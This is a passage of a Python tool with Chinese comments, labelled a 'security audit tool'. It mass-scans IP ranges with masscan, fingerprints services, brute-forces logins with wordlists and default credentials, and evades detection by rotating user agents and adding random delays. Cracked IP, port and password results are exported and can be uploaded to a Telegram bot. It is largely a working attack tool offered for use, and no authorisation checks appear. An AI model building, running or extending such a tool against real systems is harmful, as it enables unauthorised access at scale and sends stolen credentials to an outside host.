    "SecLists/Usernames/names.txt",
    "usernames.txt",
]


def find_kali_wordlists():
    """查找系统中可用的 Kali 字典文件"""
    found_passwords = []
    found_usernames = []

    base_paths = [p for p in KALI_WORDLIST_PATHS if os.path.exists(p)]

    for base in base_paths:
        for pf in COMMON_PASSWORD_FILES:
            full = os.path.join(base, pf.strip())
            if os.path.isfile(full):
                found_passwords.append(full)
        for uf in COMMON_USERNAME_FILES:
            full = os.path.join(base, uf.strip())
            if os.path.isfile(full):
                found_usernames.append(full)

    if not found_passwords:
        rockyou = "/usr/share/wordlists/rockyou.txt"
        if os.path.exists(rockyou):
            found_passwords.append(rockyou)
        gz = rockyou + ".gz"
        if os.path.exists(gz):
            found_passwords.append(gz + " (需要先 gunzip)")

    return found_passwords, found_usernames


def load_credentials_enhanced():
    """增强版凭证加载 - 支持 Kali 字典"""
    ui_print()
    ui_print("字典来源:")
    ui_print("1. 本地文件 (username.txt / password.txt)")
    ui_print("2. Kali 系统字典")
    ui_print("3. 使用默认凭证")
    source = input("  选择字典来源（默认3）：").strip()
    if source == "":
        source = "3"

    if source == "1":
        return _load_local_wordlists()
    elif source == "2":
        return _load_kali_wordlists()
    else:
        return _load_default_credentials()


def _load_local_wordlists():
    """加载本地字典文件"""
    if TEMPLATE_MODE == 7:
        usernames = ["2cXaAxRGfddmGz2yx1wA"]
        if not os.path.exists("password.txt"):
            ui_err("缺少 password.txt 文件")
            sys.exit(1)
        passwords = open("password.txt", encoding='utf-8').read().splitlines()
    elif TEMPLATE_MODE == 9:
        usernames = ["sk-123456"]
        if not os.path.exists("password.txt"):
            ui_err("缺少 password.txt 文件")
            sys.exit(1)
        passwords = open("password.txt", encoding='utf-8').read().splitlines()
    else:
        if not os.path.exists("username.txt") or not os.path.exists("password.txt"):
            ui_err("缺少 username.txt 或 password.txt 文件")
            sys.exit(1)
        usernames = open("username.txt", encoding='utf-8').read().splitlines()
        passwords = open("password.txt", encoding='utf-8').read().splitlines()
    ui_ok(f"已加载 {len(usernames)} 个用户名, {len(passwords)} 个密码")
    return usernames, passwords


def _load_kali_wordlists():
    """加载 Kali 系统字典"""
    pwd_files, user_files = find_kali_wordlists()

    if not pwd_files:
        ui_warn("未找到 Kali 系统字典，请确认是否在 Kali Linux 上运行")
        ui_info("回退到默认凭证")
        return _load_default_credentials()

    ui_print()
    ui_print("可用密码字典:")
    for i, f in enumerate(pwd_files):
        ui_print(f"{i+1}. {f}")
    idx = input(f"  选择密码字典（默认1）：").strip()
    if not idx:
        idx = "1"
    try:
        pwd_path = pwd_files[int(idx) - 1]
    except (ValueError, IndexError):
        pwd_path = pwd_files[0]

    if pwd_path.endswith(".gz"):
        ui_err(f"字典为压缩格式，请先解压: gunzip {pwd_path}")
        sys.exit(1)

    passwords = open(pwd_path, encoding='utf-8', errors='ignore').read().splitlines()
    passwords = [p.strip() for p in passwords if p.strip()]

    usernames = ["admin"]
    if user_files:
        ui_print()
        ui_print("可用用户名字典:")
        ui_print("0. 使用默认用户名")
        for i, f in enumerate(user_files):
            ui_print(f"{i+1}. {f}")
        idx = input("  选择用户名字典（默认0）：").strip()
        if not idx:
            idx = "0"
        try:
            user_idx = int(idx) - 1
            if 0 <= user_idx < len(user_files):
                usernames = open(user_files[user_idx], encoding='utf-8', errors='ignore').read().splitlines()
                usernames = [u.strip() for u in usernames if u.strip()]
        except (ValueError, IndexError):
            pass

    ui_ok(f"已加载 {len(usernames)} 个用户名, {len(passwords)} 个密码")
    return usernames, passwords


def _load_default_credentials():
    """加载默认凭证"""
    if TEMPLATE_MODE == 3:
        return ["sysadmin"], ["sysadmin"]
    elif TEMPLATE_MODE == 7:
        return ["2cXaAxRGfddmGz2yx1wA"], ["2cXaAxRGfddmGz2yx1wA"]
    elif TEMPLATE_MODE == 8:
        return ["root"], ["password"]
    elif TEMPLATE_MODE == 9:
        return ["sk-123456"], ["sk-123456"]
    elif TEMPLATE_MODE == 15:
        return ["welcome", "sui", "hui", "misub", "nezha"], ["welcome", "sui", "hui", "misub", "nezha"]
    else:
        return ["admin"], ["admin"]


# =========================== 断点续扫 (Task 4.1) ===========================

def save_progress(progress_file, data):
    """保存扫描进度"""
    import json as _json
    with open(progress_file, 'w', encoding='utf-8') as f:
        _json.dump(data, f, ensure_ascii=False)


def load_progress(progress_file):
    """加载扫描进度"""
    import json as _json
    if os.path.exists(progress_file):
        with open(progress_file, 'r', encoding='utf-8') as f:
            return _json.load(f)
    return None


# =========================== 结果去重 (Task 4.2) ===========================

def deduplicate_results(results):
    """结果去重 - 按 IP:端口 去重（同一 IP 不同端口视为不同服务）"""
    seen = {}
    for item in results:
        parts = item.split()
        host_port = parts[0] if parts else item.strip()
        if ":" not in host_port:
            host_port = host_port + ":0"
        if host_port not in seen:
            seen[host_port] = item
    return list(seen.values())


# =========================== 多格式导出 (Task 4.4) ===========================

def export_results_to_json(results, output_file):
    """导出为 JSON 格式"""
    import json as _json
    data = []
    for line in results:
        line = line.strip()
        if not line:
            continue
        parts = line.split(":")
        if len(parts) >= 3:
            data.append({"ip": parts[0], "port": parts[1], "credentials": ":".join(parts[2:])})
        elif len(parts) == 2:
            data.append({"ip": parts[0], "info": parts[1]})
        else:
            data.append({"value": line})
    with open(output_file, 'w', encoding='utf-8') as f:
        _json.dump(data, f, ensure_ascii=False, indent=2)
    ui_ok(f"JSON 导出: {output_file}")


def export_results_to_csv(results, output_file):
    """导出为 CSV 格式"""
    import csv
    with open(output_file, 'w', newline='', encoding='utf-8') as f:
        writer = csv.writer(f)
        writer.writerow(["IP", "Port", "Username", "Password", "Extra"])
        for line in results:
            line = line.strip()
            if not line:
                continue
            parts = line.split(":")
            if len(parts) >= 4:
                writer.writerow([parts[0], parts[1], parts[2], parts[3], ":".join(parts[4:])])
            elif len(parts) == 3:
                writer.writerow([parts[0], parts[1], parts[2], "", ""])
            elif len(parts) == 2:
                writer.writerow([parts[0], parts[1], "", "", ""])
            else:
                writer.writerow([line, "", "", "", ""])
    ui_ok(f"CSV 导出: {output_file}")


# =========================== 限速与反检测 (Task 4.3) ===========================

import random as _random

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
]


def random_delay(min_s=0.1, max_s=0.5):
    """随机延迟"""
    time.sleep(_random.uniform(min_s, max_s))


def random_user_agent():
    """随机 User-Agent"""
    return _random.choice(USER_AGENTS)


# =========================== IP文件解析 ===========================

import ipaddress

def parse_ip_file(filepath):
    """
    解析IP文件，支持格式:
    - CIDR: 192.168.1.0/24
    - 范围: 192.168.1.1-192.168.1.255
    - 单IP: 192.168.1.1
    - IP+端口: 192.168.1.1:8080 或 192.168.1.1 8080
    - 注释行: # xxx
    - 空行自动跳过
    返回: (cidr_list, explicit_ip_ports)
    """
    cidrs = []
    explicit = []
    with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
        for raw in f:
            line = raw.strip()
            if not line or line.startswith('#'):
                continue
            # 去掉行内注释
            if '#' in line:
                line = line[:line.index('#')].strip()
            # IP:PORT 格式
            if ':' in line and not line.startswith('['):
                parts = line.rsplit(':', 1)
                try:
                    ipaddress.ip_address(parts[0])
                    port = int(parts[1])
                    explicit.append((parts[0], port))
                    continue
                except ValueError:
                    pass
            # IP PORT 空格分隔
            parts = line.split()
            if len(parts) == 2:
                try:
                    ipaddress.ip_address(parts[0])
                    port = int(parts[1])
                    explicit.append((parts[0], port))
                    continue
                except ValueError:
                    pass
            # CIDR
            if '/' in line:
                try:
                    net = ipaddress.ip_network(line, strict=False)
                    cidrs.append(str(net))
                    continue
                except ValueError:
                    pass
            # 范围 x.x.x.x-y.y.y.y
            if '-' in line:
                a, b = line.split('-', 1)
                try:
                    start = ipaddress.ip_address(a.strip())
                    end = ipaddress.ip_address(b.strip())
                    for ip_int in range(int(start), int(end) + 1):
                        cidrs.append(str(ipaddress.ip_address(ip_int)))
                    continue
                except ValueError:
                    pass
            # 单个IP
            try:
                ipaddress.ip_address(line)
                cidrs.append(line)
                continue
            except ValueError:
                pass
            ui_info(f"跳过无法识别的行: {raw.strip()}")
    return cidrs, explicit


# =========================== 统一入口 (Task 3.5 + 4.5) ===========================


def run_pipeline(mode):
    """
    统一流水线: masscan端口扫描 → 指纹验证 → 统一引擎审查
    支持断点续扫、结果去重、多格式导出
    """
    from datetime import datetime, timedelta, timezone

    t_start = time.time()
    stats = {}
    display_name = MODE_DISPLAY_NAMES.get(mode, "未知")

    ui_stage(f"模式 {mode} · {display_name}")

    progress_file = os.path.join(WORK_DIR, f".progress_mode_{mode}.json")

    # 检查断点续扫
    progress = load_progress(progress_file)
    if progress:
        resume = input("发现未完成的扫描进度，是否继续？(Y/n)：").strip().lower()
        if resume != "n":
            ui_info("从断点继续...")
            input_file = progress.get("input_file", "prefixes.txt")
            ports = progress.get("ports", [])
            # 重新加载凭证（进度中不保存密码）
            usernames, passwords = load_credentials_enhanced()
        else:
            progress = None

    if not progress:
        # 1. 加载配置
        config = load_mode_config(mode)

        # 2. 获取端口
        ports = get_ports_for_mode(config, True)
        ui_info(f"扫描端口: {','.join(map(str, ports))}")

        # 3. 加载凭证 (提前到扫描前)
        usernames, passwords = load_credentials_enhanced()
        stats["字典"] = f"{len(usernames)} 用户 × {len(passwords)} 密码"

        # 4. 选择输入方式
        ui_print()
        ui_print("输入方式:")
        ui_print("1. 直接输入 IP 列表文件")
        ui_print("2. 输入 IP 范围，自动 masscan 扫描")
        ui_print("3. 从文件读取 IP/CIDR（支持混合格式）")
        input_choice = input("  选择（默认2）：").strip()
        if input_choice == "":
            input_choice = "2"

        ui_stage("目标获取")
        if input_choice == "1":
            input_file = input_filename_with_default("请输入 IP 列表文件名", "prefixes.txt")
            if not os.path.exists(input_file):
                ui_err("文件不存在")
                sys.exit(1)
        elif input_choice == "3":
            filepath = input("请输入文件路径（默认 prefixes.txt）：").strip()
            if not filepath:
                filepath = "prefixes.txt"
            if not os.path.exists(filepath):
                ui_err(f"文件不存在: {filepath}")
                sys.exit(1)
            cidrs, explicit = parse_ip_file(filepath)
            ui_info(f"解析到 {len(cidrs)} 个CIDR/IP, {len(explicit)} 个IP:端口")
            masscan_results = []
            if cidrs:
                open(MASSCAN_RESULTS, 'w').close()
                for cidr in cidrs:
                    results = run_masscan(cidr, ports)
                    masscan_results.extend(results)
            for ip, port in explicit:
                masscan_results.append((ip, port))
            if not masscan_results:
                ui_warn("未发现开放端口，流程结束")
                return None
            input_file = MASSCAN_FILTERED
            with open(input_file, 'w', encoding='utf-8') as f:
                for ip, port in masscan_results:
                    f.write(f"{ip}:{port}\n")
        else:
            ip_range = input("请输入 IP 范围（如 192.168.1.0/24）：").strip()
            if not ip_range:
                ui_err("未输入 IP 范围")
                sys.exit(1)

            open(MASSCAN_RESULTS, 'w').close()
            masscan_results = run_masscan(ip_range, ports)

            if not masscan_results:
                ui_warn("masscan 未发现开放端口，流程结束")
                return None
            stats["开放端口"] = len(masscan_results)

            filtered = filter_by_fingerprint(masscan_results, config)
            ui_info(f"指纹验证 {len(masscan_results)} 个目标 → 匹配 {len(filtered)} 个")

            if not filtered:
                ui_warn("指纹验证后无匹配目标，流程结束")
                return None
            stats["指纹匹配"] = len(filtered)

            input_file = MASSCAN_FILTERED
            with open(input_file, 'w', encoding='utf-8') as f:
                for ip, port in filtered:
                    f.write(f"{ip}:{port}\n")

        # 5. 保存进度（不保存密码，恢复时重新加载）
        save_progress(progress_file, {
            "mode": mode,
            "input_file": input_file,
            "ports": ports,
        })

    # 5. 运行统一引擎
    ui_stage("统一引擎审查")
    config = load_mode_config(mode)
    config_path = prepare_unified_engine(config, input_file, usernames, passwords, ports, ENGINE_INPUT)
    run_unified_engine(config_path, ENGINE_INPUT)

    # 清理进度文件
    if os.path.exists(progress_file):
        os.remove(progress_file)

    # 6. 整理结果（引擎输出在 WORK_DIR 下）
    output_name = os.path.join(WORK_DIR, MODE_NAMES.get(mode, "output") + ".txt")
    beijing_time = datetime.now(timezone.utc) + timedelta(hours=8)
    time_str = beijing_time.strftime("%Y%m%d-%H%M%S")

    final_result_file = None
    hit_count = 0
    if os.path.exists(output_name):
        # 结果去重
        with open(output_name, 'r', encoding='utf-8') as f:
            raw_results = f.readlines()
        deduped = deduplicate_results(raw_results)
        hit_count = len(deduped)

        final_result_file = os.path.join(RESULT_DIR, f"{display_name}-{time_str}.txt")
        with open(final_result_file, 'w', encoding='utf-8') as f:
            f.writelines(deduped)
        ui_ok(f"结果已保存: {final_result_file}（去重后 {hit_count} 条）")

        # 多格式导出
        ui_print()
        ui_print("导出格式:")
        ui_print("1. TXT (默认)")
        ui_print("2. JSON")
        ui_print("3. CSV")
        ui_print("4. 全部")
        export_choice = input("  选择（默认1）：").strip()
        if export_choice == "":
            export_choice = "1"

        if export_choice in ("2", "4"):
            json_file = os.path.join(RESULT_DIR, f"{display_name}-{time_str}.json")
            export_results_to_json(deduped, json_file)
        if export_choice in ("3", "4"):
            csv_file = os.path.join(RESULT_DIR, f"{display_name}-{time_str}.csv")
            export_results_to_csv(deduped, csv_file)
    else:
        ui_warn("引擎未生成结果文件")

    elapsed = int(time.time() - t_start)
    rows = [("模式", f"{mode} · {display_name}"), ("用时", f"{elapsed // 60} 分 {elapsed % 60} 秒")]
    if stats.get("字典"):
        rows.append(("字典", stats["字典"]))
    if stats.get("开放端口"):
        rows.append(("开放端口", stats["开放端口"]))
    if stats.get("指纹匹配"):
        rows.append(("指纹匹配", stats["指纹匹配"]))
    rows.append(("审查命中", hit_count))
    if final_result_file:
        rows.append(("结果文件", os.path.basename(final_result_file)))
    ui_summary(rows, "本模式汇总")

    return final_result_file


def run_pipeline_all(exclude_modes=(), exclude_ports=()):
    """
    模式 14: 全服务扫描 — 并行扫描所有服务类型 (Task 4.5)
    模式 16: 精简版 — exclude_modes=(6,) 跳过 SSH，并 exclude_ports 跳过通用 Web 端口
    """
    from datetime import datetime, timedelta, timezone
    from concurrent.futures import ThreadPoolExecutor, as_completed
    t_start = time.time()

    exclude_modes = set(exclude_modes)
    exclude_ports = set(exclude_ports)
    title = "模式 16 · 全服务扫描（不含SSH）" if 6 in exclude_modes else "模式 14 · 全服务扫描"
    ui_stage(title)

    ui_print("输入方式:")
    ui_print("1. 输入 IP 范围（如 192.168.1.0/24）")
    ui_print("2. 从文件读取（支持 CIDR/范围/单IP/IP:端口，每行一个）")
    input_choice = input("  选择（默认2）：").strip()
    if input_choice == "":
        input_choice = "2"

    # 提前加载字典（扫描前完成交互）
    usernames, passwords = load_credentials_enhanced()

    # 全端口列表由各服务配置汇总而来，避免手工维护漏项
    all_ports = []
    for _m in list(range(1, 14)) + [15]:
        if _m in exclude_modes:
            continue
        try:
            for _p in load_mode_config(_m).get("default_ports", []):
                if _p in exclude_ports:
                    continue
                if _p not in all_ports:
                    all_ports.append(_p)
        except SystemExit:
            continue
    if not all_ports:
        ui_err("未从配置中读取到任何端口")
        return None

    masscan_results = []

    ui_stage("全端口 masscan 扫描")
    if input_choice == "1":
        ip_range = input("请输入 IP 范围（如 192.168.1.0/24）：").strip()
        if not ip_range:
            ui_err("未输入 IP 范围")
            sys.exit(1)
        open(MASSCAN_RESULTS, 'w').close()
        masscan_results = run_masscan(ip_range, all_ports)

    else:
        filepath = input("请输入文件路径（默认 prefixes.txt）：").strip()
        if not filepath:
            filepath = "prefixes.txt"
        if not os.path.exists(filepath):
            ui_err(f"文件不存在: {filepath}")
            sys.exit(1)
        cidrs, explicit = parse_ip_file(filepath)
        ui_info(f"解析到 {len(cidrs)} 个CIDR/IP, {len(explicit)} 个IP:端口")

        # CIDR 走 masscan
        if cidrs:
            open(MASSCAN_RESULTS, 'w').close()
            for cidr in cidrs:
                results = run_masscan(cidr, all_ports)
                masscan_results.extend(results)

        # 显式 IP:端口 直接加入结果
        for ip, port in explicit:
            masscan_results.append((ip, port))

    if not masscan_results:
        ui_warn("masscan 未发现开放端口")
        return None


    port_groups = {}
    for ip, port in masscan_results:
        if port not in port_groups:
            port_groups[port] = []
        port_groups[port].append(ip)

    ui_stage("指纹识别")
    ui_info(f"{len(port_groups)} 个端口组，统一并发指纹验证...")
    web_keywords = load_web_keywords()
    matched_modes = {}

    # --- B: 构建 per-IP 任务，全局统一并发（组间不再串行） ---
    # 预加载所有 mode 配置，避免在并发 worker 内重复读盘
    mode_configs = {}
    for mode_id in list(range(1, 14)) + [15]:
        if mode_id in exclude_modes:
            continue
        try:
            mode_configs[mode_id] = load_mode_config(mode_id)
        except SystemExit:
            ui_warn(f"模式{mode_id} 配置文件缺失，已跳过该服务")
            continue
        except Exception as e:
            ui_err(f"模式{mode_id} 配置加载失败: {e}")
            continue

    # 先确定每个端口对应的候选 mode（端口匹配规则不变）
    port_mode_cache = {}
    for port in port_groups:
        if port in exclude_ports:
            continue
        mods = []
        for mode_id, config in mode_configs.items():
            if port in config.get("default_ports", []):
                mods.append(mode_id)
        port_mode_cache[port] = mods

    # 按 IP 归并其在各端口的探测任务（同 IP 同端口去重）
    ip_ports = {}
    for port, ips in port_groups.items():
        if port in exclude_ports:
            continue
        for ip in ips:
            lst = ip_ports.setdefault(ip, [])
            if port not in lst:
                lst.append(port)

    total_ips = len(ip_ports)
    if total_ips == 0:
        ui_warn("masscan 结果中的端口均被排除，无需指纹识别")
        return None

    def _check_one_ip(ip, ports):
        """单 IP 的多端口探测；E1: 同一服务命中后，跳过该 IP 该服务的其它端口
        返回 (hits, done_pairs): hits=[(mode_id, ip, port)]，done_pairs=[(ip, port)] 为本次成功探测的组合
        """
        hits = []              # [(mode_id, ip, port)]
        checked = []           # [(ip, port)] 本次真正探测过的组合
        claimed_modes = set()  # E1: 该 IP 已命中的服务
        for port in ports:
            cand_modes = port_mode_cache.get(port, [])
            known_hit = False
            # 无候选服务（未知端口）时也应跑通用 Web 指纹兜底；
            # 仅当「有候选但全部因 E1 已命中而跳过」时才不兜底
            skipped_by_e1 = bool(cand_modes)
            for mode_id in cand_modes:
                if mode_id in claimed_modes:
                    continue  # E1 短路
                skipped_by_e1 = False
                config = mode_configs.get(mode_id)
                if config is None:
                    continue
                # 直接同步调用，避免为单条目标反复创建线程池
                try:
                    ok = bool(fingerprint_scan(f"{ip}:{port}", config))
                except Exception:
                    ok = False
                if ok:
                    hits.append((mode_id, ip, port))
                    claimed_modes.add(mode_id)
                    known_hit = True
                    break
            # 仅在「无候选服务」或「真探测未命中」时跑通用 Web 指纹；
            # 若候选服务均已被本 IP 的其它端口命中（E1 跳过），则不再兜底
            if not known_hit and not skipped_by_e1 and web_keywords:
                mid = fingerprint_web_title(ip, port, web_keywords)
                if mid is not None and mid not in exclude_modes and mid not in claimed_modes:
                    hits.append((mid, ip, port))
                    claimed_modes.add(mid)
            checked.append((ip, port))
        return hits, checked

    # --- C: 断点续扫 —— 载入已完成的 (ip,port) 与已命中结果 ---
    # 注意：以 (ip, port) 为粒度记录，避免端口清单变化后续跑误跳过未探测端口
    # 若存在旧进度，先询问是否续扫；选择全新扫描则清空，避免静默跳过旧目标
    has_progress = os.path.exists(FINGERPRINT_DONE) or os.path.exists(FINGERPRINT_HITS)
    if has_progress:
        ans = input("发现上次未完成的指纹进度，是否续扫？(Y/n)：").strip().lower()
        if ans == "n":
            for _p in (FINGERPRINT_HITS, FINGERPRINT_DONE):
                try:
                    open(_p, 'w').close()
                except OSError:
                    pass
            ui_info("已清空旧进度，执行全新扫描")
        else:
            ui_info("从断点继续指纹验证...")

    done_pairs = set()
    if os.path.exists(FINGERPRINT_DONE):
        with open(FINGERPRINT_DONE, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                parts = line.rstrip('\n').split('\t')
                if len(parts) == 2:
                    try:
                        done_pairs.add((parts[0], int(parts[1])))
                    except ValueError:
                        continue
    seen_pairs = set()   # 全局去重：防止续跑重复计数
    if os.path.exists(FINGERPRINT_HITS):
        with open(FINGERPRINT_HITS, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                parts = line.rstrip('\n').split('\t')
                if len(parts) == 3:
                    try:
                        mid = int(parts[0])
                        port_v = int(parts[2])
                    except ValueError:
                        continue
                    pair = (mid, parts[1], port_v)
                    if pair in seen_pairs:
                        continue
                    seen_pairs.add(pair)
                    matched_modes.setdefault(mid, []).append((parts[1], port_v))

    # 待探测目标以 (ip, port) 为单位，仅跳过真正已完成的组合
    pending = []
    for ip, ports in ip_ports.items():
        todo = [p for p in ports if (ip, p) not in done_pairs]
        if todo:
            pending.append((ip, todo))
    if done_pairs:
        ui_info(f"续跑：已完成 {len(done_pairs)} 个(IP,端口)，剩余 {len(pending)} 个 IP 待处理")
    if not pending:
        ui_ok("所有目标已完成指纹验证（续跑完成）")

    # --- A: 增量落盘（每批完成后 flush），被杀也能保住已扫结果 ---
    hits_f = None
    done_f = None

    def _flush_batch(batch_hits, batch_done):
        for mode_id, ip, port in batch_hits:
            pair = (mode_id, ip, port)
            if pair in seen_pairs:
                continue
            seen_pairs.add(pair)
            hits_f.write(f"{mode_id}\t{ip}\t{port}\n")
            matched_modes.setdefault(mode_id, []).append((ip, port))
        for ip, port in batch_done:
            done_f.write(f"{ip}\t{port}\n")
        hits_f.flush()
        done_f.flush()
        os.fsync(hits_f.fileno())
        os.fsync(done_f.fileno())

    # --- B: 分批提交，避免一次性创建海量 future 导致内存暴涨/被 OOM kill ---
    total_pending = len(pending)
    done = 0
    batch_size = 2000
    max_workers = min(32, total_pending) if total_pending else 1
    try:
        hits_f = open(FINGERPRINT_HITS, 'a', encoding='utf-8')
        done_f = open(FINGERPRINT_DONE, 'a', encoding='utf-8')
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            for start in range(0, total_pending, batch_size):
                batch = pending[start:start + batch_size]
                futures = {executor.submit(_check_one_ip, ip, ports): ip
                           for ip, ports in batch}
                batch_hits = []
                batch_done = []
                for future in as_completed(futures):
                    done += 1
                    ui_progress(done, total_pending, prefix="指纹验证")
                    try:
                        hits, checked = future.result()
                    except Exception:
                        # 探测异常：不标记为已完成，续跑时会重试该 IP
                        continue
                    batch_hits.extend(hits)
                    batch_done.extend(checked)
                _flush_batch(batch_hits, batch_done)
    finally:
        if hits_f is not None:
            hits_f.close()
        if done_f is not None:
            done_f.close()

    for mode_id, targets in matched_modes.items():
        ui_info(f"模式{mode_id} {MODE_DISPLAY_NAMES.get(mode_id)} 匹配 {len(targets)} 个")

    if not matched_modes:
        ui_warn("未匹配到任何已知服务")
        return None

    ui_stage("并行审查")
    ui_ok(f"匹配到 {len(matched_modes)} 个服务类型，开始并行审查（最多 4 并发）")
    for mode_id, targets in matched_modes.items():
        ui_phase_log(mode_id, f"{len(targets)} 个目标")

    all_results = []
    mode_timings = {}
    t_scan = time.time()

    def _run_mode_bruteforce(mode_id, targets):
        """单个模式的审查任务（中间文件全部在 WORK_DIR，每模式独立子目录避免并发冲突）"""
        import threading
        config = load_mode_config(mode_id)
        mdir = os.path.join(WORK_DIR, f"mode_{mode_id}_{threading.get_ident()}")
        os.makedirs(mdir, exist_ok=True)
        input_file = os.path.join(mdir, "targets.txt")
        with open(input_file, 'w', encoding='utf-8') as f:
            for ip, port in targets:
                f.write(f"{ip}:{port}\n")

        # 每模式独立：user/pass/config/input/output 都在 mdir
        shutil.copy(input_file, os.path.join(mdir, "results.txt"))
        with open(os.path.join(mdir, "user.txt"), 'w', encoding='utf-8') as f:
            f.write('\n'.join(usernames))
        with open(os.path.join(mdir, "pass.txt"), 'w', encoding='utf-8') as f:
            f.write('\n'.join(passwords))
        config["active_ports"] = []
        conf_path = os.path.join(mdir, "engine_config.json")
        with open(conf_path, 'w', encoding='utf-8') as f:
            _json.dump(config, f, ensure_ascii=False, indent=2)

        # 在 mdir 中运行引擎（输出 <mode>.txt 落在 mdir），使用预编译二进制避免并发竞争
        engine_bin = build_engine()
        subprocess.run([engine_bin, os.path.abspath(conf_path),
                        os.path.abspath(os.path.join(mdir, "results.txt"))],
                       check=True, cwd=mdir,
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        output_name = os.path.join(mdir, MODE_NAMES.get(mode_id, "output") + ".txt")
        if os.path.exists(output_name):
            with open(output_name, 'r', encoding='utf-8') as f:
                results = f.readlines()
            deduped = deduplicate_results(results)
            return (mode_id, deduped, len(deduped))
        return None

    # 并行执行各模式审查 (最多 4 个并行)
    # 结果文件在「该模式完成的瞬间」就写入 results/，中途被杀也能保住已完成的服务
    beijing_time = datetime.now(timezone.utc) + timedelta(hours=8)
    time_str = beijing_time.strftime("%Y%m%d-%H%M%S")
    max_workers = min(4, len(matched_modes))
    final_result_files = []
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {}
        for mode_id, targets in matched_modes.items():
            future = executor.submit(_run_mode_bruteforce, mode_id, targets)
            futures[future] = mode_id

        for future in as_completed(futures):
            mode_id = futures[future]
            try:
                result = future.result()
                if result:
                    all_results.append(result)
                    display_name = MODE_DISPLAY_NAMES.get(mode_id, "output")
                    final_name = os.path.join(RESULT_DIR, f"{display_name}-{time_str}.txt")
                    with open(final_name, 'w', encoding='utf-8') as f:
                        f.writelines(result[1])
                    final_result_files.append(final_name)
                    ui_phase_log(mode_id, _c(f"完成 · {result[2]} 条命中 → {final_name}", "green"))
                else:
                    ui_phase_log(mode_id, "完成 · 0 条命中")
            except Exception as e:
                ui_phase_log(mode_id, _c(f"失败: {e}", "red"))
            mode_timings[mode_id] = time.time()

    scan_elapsed = int(time.time() - t_scan)

    total_elapsed = int(time.time() - t_start)
    total_hits = sum(r[2] for r in all_results)
    rows = [
        ("扫描端口组", len(port_groups)),
        ("匹配服务", len(matched_modes)),
        ("字典", f"{len(usernames)} 用户 × {len(passwords)} 密码"),
        ("审查命中", total_hits),
        ("审查用时", f"{scan_elapsed // 60} 分 {scan_elapsed % 60} 秒"),
        ("总用时", f"{total_elapsed // 60} 分 {total_elapsed % 60} 秒"),
    ]
    for mode_id, targets in matched_modes.items():
        hit = next((r[2] for r in all_results if r[0] == mode_id), 0)
        rows.append((f"  模式{mode_id} {MODE_DISPLAY_NAMES.get(mode_id)}", f"{len(targets)} 目标 / {hit} 命中"))
    ui_summary(rows, "全服务扫描汇总")

    return final_result_files[0] if len(final_result_files) == 1 else final_result_files


# =========================== 入口 ===========================


if __name__ == "__main__":
        start = time.time()
        interrupted = False
        final_result_file = None

        try:
                check_environment()
                ui_stage("安全审计工具 v2.0 · 统一引擎")

                if TEMPLATE_MODE == 14:
                        final_result_file = run_pipeline_all()
                elif TEMPLATE_MODE == 16:
                        final_result_file = run_pipeline_all(exclude_modes=(6,), exclude_ports=(80, 443, 8080, 8443))
                else:
                        final_result_file = run_pipeline(TEMPLATE_MODE)

        except KeyboardInterrupt:
                print()
                ui_warn("用户中断操作（Ctrl+C），准备清理临时文件...")
                interrupted = True
        except BaseException:
                # 异常退出同样保留进度，便于断点续扫
                interrupted = True
                raise
        finally:
                clean_temp_files(keep_progress=interrupted)
                end = time.time()
                cost = int(end - start)

                if interrupted:
                        ui_warn(f"脚本已被用户中断，中止前共运行 {cost // 60} 分 {cost % 60} 秒")
                else:
                        ui_ok(f"全部完成！总用时 {cost // 60} 分 {cost % 60} 秒")

                # ====== 自动上传 Telegram ======
                TELEGRAM_BOT_TOKEN = ""
                TELEGRAM_CHAT_ID = ""

                def load_telegram_config():
                        global TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID
                        if os.path.exists("telegram_config.txt"):
                                with open("telegram_config.txt", encoding="utf-8") as f:
                                        for line in f:
                                                line = line.strip()
                                                if line.startswith("BOT_TOKEN="):
                                                        TELEGRAM_BOT_TOKEN = line.split("=", 1)[1]
                                                elif line.startswith("CHAT_ID="):
                                                        TELEGRAM_CHAT_ID = line.split("=", 1)[1]

                def send_to_telegram(file_path, bot_token, chat_id):
                        import requests
                        import os

                        if not os.path.exists(file_path):
                                ui_warn(f"Telegram 上传失败：文件 {file_path} 不存在")
                                return

                        url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
                        with open(file_path, "rb") as f:
                                files = {'document': f}
                                data = {'chat_id': chat_id, 'caption': f"审查结果：{os.path.basename(file_path)}"}
                                try:
                                        response = requests.post(url, data=data, files=files)
                                        if response.status_code == 200:
                                                ui_ok(f"文件 {file_path} 已发送到 Telegram")
                                        else:
                                                ui_err(f"TG上传失败，状态码：{response.status_code}，返回：{response.text}")
                                except Exception as e:
                                        ui_err(f"发送到 TG 失败：{e}")

                load_telegram_config()
                if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
                        ui_warn("Telegram 未配置（缺少 telegram_config.txt 或 BOT_TOKEN/CHAT_ID 为空），跳过上传")
                elif final_result_file:
                        if isinstance(final_result_file, list):
                                for f in final_result_file:
                                        send_to_telegram(f, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID)
                        else:
                                send_to_telegram(final_result_file, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID)
